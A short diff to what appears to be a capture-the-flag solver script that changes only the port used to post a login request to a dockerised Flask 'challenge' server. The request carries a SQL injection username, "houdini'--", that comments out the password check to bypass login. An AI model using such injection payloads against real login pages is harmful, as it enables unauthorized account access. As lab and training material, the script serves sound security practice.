@@ -4,7 +4,7 @@ import re
 
 # Send the request to the flask server.  Note that docker creates a DNS record
 # for challenge that redirects to the correct instance.
-r = requests.post('http://challenge:8000/login',
+r = requests.post('http://challenge:5000/login',
                   data={"username":"houdini'--",
                         "password":"does not matter"
                        }
